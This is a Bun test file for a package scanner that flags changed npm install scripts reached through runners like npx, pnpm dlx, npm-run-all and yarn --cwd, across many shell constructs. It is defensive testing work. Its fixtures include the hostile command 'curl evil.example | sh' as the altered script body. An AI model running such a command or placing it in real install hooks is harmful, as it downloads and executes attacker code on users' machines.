import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = (s: string) => new TextEncoder().encode(s);
const files = (o: Record<string, string>): FileMap => new Map(Object.entries(o).map(([k, v]) => [k, enc(v)]));
const holds = (old: FileMap, now: FileMap) => prepass("npm", old, now).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);

// The install hook runs `evil` through a runner; only the body of the script `evil` changes between the two releases, so
// the change is seen only when the runner is followed to that script.
const release = (evil: string, hook: string, other = "echo other") =>
  files({ "package.json": JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: hook, evil, quiet: "echo hi", other } }) });
const bodyHeld = (hook: string) => holds(release("echo a", hook), release("curl evil.example | sh", hook)).length > 0;
const otherHeld = (hook: string) => holds(release("echo a", hook, "echo one"), release("echo a", hook, "curl evil.example | sh")).length > 0;

// Each runner form placed where the shell still runs it: after && or ||, in an if, a loop, a case arm, a group, a
// subshell and a function body.
const places: ((c: string) => string)[] = [
  (c) => c,
  (c) => `true && ${c}`,
  (c) => `false || ${c}`,
  (c) => `echo a; ${c}`,
  (c) => `if true; then ${c}; fi`,
  (c) => `if ${c}; then :; fi`,
  (c) => `if false; then :; else ${c}; fi`,
  (c) => `f() { ${c}; }; f`,
  (c) => `function f { ${c}; }; f`,
  (c) => `f() (${c}); f`,
  (c) => `{ ${c}; }`,
  (c) => `(${c})`,
  (c) => `while ${c}; do break; done`,
  (c) => `for i in 1; do ${c}; done`,
  (c) => `case x in x) ${c};; esac`,
  (c) => `! ${c}`,
  (c) => `true && if true; then ${c}; fi`,
  (c) => `f() {\n ${c}\n}\nf`,
];
const everywhere = (forms: string[]) => forms.flatMap((c) => places.map((p) => p(c)));

describe("a script runner reached through a package runner is followed to the script it names", () => {
  test("npx, bunx, pnpm dlx and exec, and yarn run-s, run-p and npm-run-all", () => {
    for (const h of everywhere(["npx run-s evil", "npx --yes run-s evil", "npx npm-run-all evil", "npx run-p evil", "bunx run-s evil", "pnpm dlx run-s evil", "pnpm exec run-s evil", "yarn run-s evil", "yarn exec run-s evil", "npx -y npm-run-all -s evil"])) {
      expect(bodyHeld(h), h).toBe(true);
    }
  });

  test("an npm-run-all mode flag before the name keeps the name", () => {
    for (const h of everywhere(["npm-run-all -p evil", "npm-run-all --parallel evil", "npm-run-all -s -c evil", "run-p --race evil", "run-s -l evil", "npm-run-all --serial -n evil"])) {
      expect(bodyHeld(h), h).toBe(true);
    }
  });
});

describe("a directory flag that names this package runs the local script", () => {
  test("yarn --cwd ., pnpm -C . and bun --cwd .", () => {
    for (const h of everywhere(["yarn --cwd . evil", "yarn --cwd=. evil", "yarn --cwd ./ evil", "yarn --cwd . run evil", "pnpm -C . evil", "pnpm -C . run evil", "pnpm --dir . run evil", "pnpm --dir=./ evil", "bun --cwd . run evil", "bun --cwd=. run evil"])) {
      expect(bodyHeld(h), h).toBe(true);
    }
  });
});

describe("the keyword form of a function body is read like the others", () => {
  test("function f { ... } runs the runner in it", () => {
    for (const h of ["function f { run-s evil; }; f", "function f { npm-run-all evil; }; f", "function f { run-p evil; }; f", "function f {\n run-s evil\n}\nf", "function f() { run-s evil; }; f"]) {
      expect(bodyHeld(h), h).toBe(true);
    }
  });
});

describe("a script the runner does not name stays out", () => {
  test("a change to another script is quiet for the same forms", () => {
    for (const h of everywhere(["npx run-s quiet", "pnpm dlx run-s quiet", "npm-run-all -p quiet", "yarn --cwd . quiet", "pnpm -C . quiet"])) {
      expect(otherHeld(h), h).toBe(false);
    }
  });
});
